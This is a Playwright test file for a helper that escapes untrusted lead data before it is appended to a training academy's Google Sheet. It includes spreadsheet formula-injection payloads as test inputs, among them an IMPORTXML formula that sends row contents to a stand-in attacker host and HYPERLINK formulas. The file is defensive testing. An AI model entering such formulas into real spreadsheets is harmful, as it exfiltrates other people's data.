import { expect, test } from "@playwright/test";
import { escapeForSheet, leadRow } from "@/lib/sheets-format";

/**
 * Formula injection into the academy's lead spreadsheet.
 *
 * A lead is untrusted text that lands in a document a human opens in Google Sheets, and Sheets
 * executes anything beginning `=`, `+`, `-` or `@`. `=IMPORTXML("http://attacker/"&A1)` typed into
 * a name field exfiltrates the row to whoever typed it, and the academy sees a name.
 *
 * Two defences, tested here and both deliberate: the leading apostrophe below, and `RAW` rather
 * than `USER_ENTERED` on the append call. Either alone is one config change away from being wrong.
 */

test.describe("formula-leading characters are neutralised", () => {
  for (const prefix of ["=", "+", "-", "@"]) {
    test(`a value starting "${prefix}" is quoted`, () => {
      expect(escapeForSheet(`${prefix}HYPERLINK("http://attacker","click")`)).toBe(
        `'${prefix}HYPERLINK("http://attacker","click")`,
      );
    });
  }

  test("the classic exfiltration payload is neutralised", () => {
    const payload = '=IMPORTXML("http://attacker.example/?d="&CONCATENATE(A1:H1),"//a")';
    expect(escapeForSheet(payload).startsWith("'=")).toBe(true);
  });

  test("an ordinary name is untouched", () => {
    expect(escapeForSheet("Nageswara Rao K")).toBe("Nageswara Rao K");
    expect(escapeForSheet("+91 79757 09407".replace("+", ""))).toBe("91 79757 09407");
  });

  test("a phone number written with its plus is quoted, because it starts with one", () => {
    // Not a false positive to fix: Sheets really would treat "+917975709407" as an expression.
    // The apostrophe is invisible in the cell, so the academy sees the number they expect.
    expect(escapeForSheet("+917975709407")).toBe("'+917975709407");
  });
});

test.describe("row-breaking characters", () => {
  test("tabs, newlines and carriage returns collapse to spaces", () => {
    expect(escapeForSheet("line one\nline two")).toBe("line one line two");
    expect(escapeForSheet("a\tb")).toBe("a b");
    expect(escapeForSheet("a\r\nb")).toBe("a b");
  });

  test("surrounding whitespace is trimmed", () => {
    expect(escapeForSheet("  padded  ")).toBe("padded");
  });

  test("null, undefined and an empty string all become an empty cell", () => {
    expect(escapeForSheet(null)).toBe("");
    expect(escapeForSheet(undefined)).toBe("");
    expect(escapeForSheet("   ")).toBe("");
  });

  test("a number is stringified rather than dropped", () => {
    expect(escapeForSheet(25300)).toBe("25300");
    expect(escapeForSheet(0)).toBe("0");
  });
});

test.describe("the row the academy's sheet expects", () => {
  test("has one column per field, in a fixed order", () => {
    const row = leadRow({
      createdAt: "2026-09-05T10:00:00.000Z",
      type: "student",
      name: "Test Student",
      phone: "+919876543210",
      email: "test@example.com",
      course: "italian-barista-course-basic",
      batch: null,
      message: null,
      page: "/enquire",
      referrer: null,
      utmSource: "google",
      utmMedium: "cpc",
      utmCampaign: "ibc-basic-sept",
      sanityId: "abc123",
    });
    expect(row).toHaveLength(14);
    expect(row[0]).toBe("2026-09-05T10:00:00.000Z");
    expect(row[1]).toBe("student");
    expect(row[13]).toBe("abc123");
  });
});
